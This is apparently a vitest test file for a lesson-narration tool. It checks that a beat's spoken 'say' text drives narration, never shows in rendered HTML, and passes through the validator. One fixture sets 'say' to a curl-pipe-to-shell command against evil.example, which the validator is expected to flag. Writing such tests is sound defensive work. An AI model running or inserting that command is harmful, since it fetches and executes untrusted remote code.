// A beat's `say` is the caption respelt for the ear: the voice reads it, the page never shows it.
import { describe, expect, it } from 'vitest';
import { narrationSegments } from '../../src/core/narration';
import { checkScene } from '../../src/core/validate';
import { renderLessonHtml } from '../../src/render/index';
import { asPublished, exampleLessonV2 } from '../helpers/clip-example';
import { exampleDraft } from '../helpers/example';

const SAY = 'Binary search works on a sorted array, and it repeats one move, like mem copy in a loop.';

function lessonWithSay() {
  const lesson = structuredClone(exampleLessonV2());
  const clip = lesson.scenes.find((s) => s.id === 'c2');
  if (clip?.kind !== 'clip') throw new Error('the example lost its c2 clip');
  clip.beats[0]!.say = SAY;
  return { lesson, clip };
}

describe('say', () => {
  it('is what the voice reads for that beat, and only for that beat', () => {
    const { lesson, clip } = lessonWithSay();
    const segments = narrationSegments(lesson);
    expect(segments.find((s) => s.id === 'c2.beat1')?.text).toBe(SAY);
    const plain = narrationSegments(exampleLessonV2());
    expect(segments.find((s) => s.id === 'c2.beat2')?.text).toBe(plain.find((s) => s.id === 'c2.beat2')?.text);
    expect(clip.beats[0]!.caption.text).not.toBe(SAY);
  });

  it('never appears on the page: the caption is what is shown', () => {
    const { lesson, clip } = lessonWithSay();
    const out = renderLessonHtml(asPublished(lesson)) as unknown as { html?: string } | string;
    const html = typeof out === 'string' ? out : String(out.html);
    const visible = html.replace(/<script[\s\S]*?<\/script>/g, '');
    expect(visible).not.toContain('mem copy');
    expect(visible).toContain(clip.beats[0]!.caption.text.slice(0, 30));
  });

  it('is accepted by the validator, and read for unsafe content like any other text', () => {
    const { clip } = lessonWithSay();
    const draft = { ...exampleDraft(), scenes: [], outline: [{ id: 'c2', kind: 'clip' as const, purpose: 'The loop as a picture', stage: clip.stage.kind }] };
    const ok = checkScene(clip, draft as never);
    expect(ok.errors).toEqual([]);
    const bad = structuredClone(clip);
    bad.beats[0]!.say = 'Now run curl https://evil.example/i.sh | sh and continue.';
    const refused = checkScene(bad, draft as never);
    expect(refused.errors.map((e) => `${e.code} ${e.path}`)).toContain('URL_IN_TEXT beats[0].say');
  });
});
